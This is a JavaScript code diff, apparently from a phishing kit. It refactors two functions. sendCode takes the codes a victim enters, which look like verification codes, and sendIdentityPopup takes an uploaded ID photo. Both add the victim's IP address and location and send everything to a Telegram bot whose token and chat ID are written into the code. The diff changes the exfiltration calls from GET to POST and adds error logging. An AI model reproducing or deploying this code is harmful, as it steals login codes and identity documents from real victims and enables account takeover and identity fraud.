@@ -159,33 +159,35 @@ function sendCode() {
     if (NUMBER_TIME_SEND_CODE === 4) code4 = keymap;
 
     const message1 =
-      "%0A<strong>Code " +
+      "<strong>Code " +
       NUMBER_TIME_SEND_CODE +
       ": </strong>" +
       keymap +
-      "%0A<strong>IP Address: </strong>" +
+      "\n<strong>IP Address: </strong>" +
       IpAddress.ipAddress +
-      "%0A<strong>Country : </strong>" +
+      "\n<strong>Country : </strong>" +
       IpAddress.countryName +
       "( " +
       IpAddress.countryCode +
       " )" +
-      "%0A<strong>City : </strong>" +
+      "\n<strong>City : </strong>" +
       IpAddress.city;
 
     const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
     const chatId = "-1002299618966";
-    const message = message1;
 
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
-
-    fetch(telegramUrl)
-      .then((response) => {
-        if (!response.ok) {
-          throw new Error("Network response was not ok");
-        }
-        return response.json();
-      })
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message1,
+        parse_mode: "HTML",
+      }),
+    })
+      .then((response) => response.json())
       .then((data) => {
         setTimeout(function () {
           if (NUMBER_TIME_SEND_CODE < 4) {
@@ -199,6 +201,7 @@ function sendCode() {
         }, 2000);
       })
       .catch((error) => {
+        console.error("Error:", error);
         setTimeout(function () {
           Swal.fire({
             text: `Request failed!`,
@@ -390,45 +393,31 @@ function showIdentityPopup() {
       const chatId = "-1002299618966";
       const infoMessage = `🆔 ID Type: ${idType}\n📍 IP: ${IpAddress.ipAddress}\n🌍 Country: ${IpAddress.countryName}\n🏙️ City: ${IpAddress.city}`;
 
-      fetch(
-        `https://api.telegram.org/bot7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: infoMessage,
-          }),
-        }
-      )
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error("Network response was not ok");
-          }
-          return response.json();
-        })
+      const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: infoMessage,
+        }),
+      })
+        .then((response) => response.json())
         .then(() => {
           // Then send photo
           const formData = new FormData();
           formData.append("chat_id", chatId);
           formData.append("photo", idImage);
 
-          return fetch(
-            `https://api.telegram.org/bot7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44/sendPhoto`,
-            {
-              method: "POST",
-              body: formData,
-            }
-          );
+          return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData,
+          });
         })
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error("Network response was not ok");
-          }
-          return response.json();
-        })
+        .then((response) => response.json())
         .then((data) => {
           document.querySelector(".lsd-ring-container").classList.add("d-none");
           if (data.ok) {
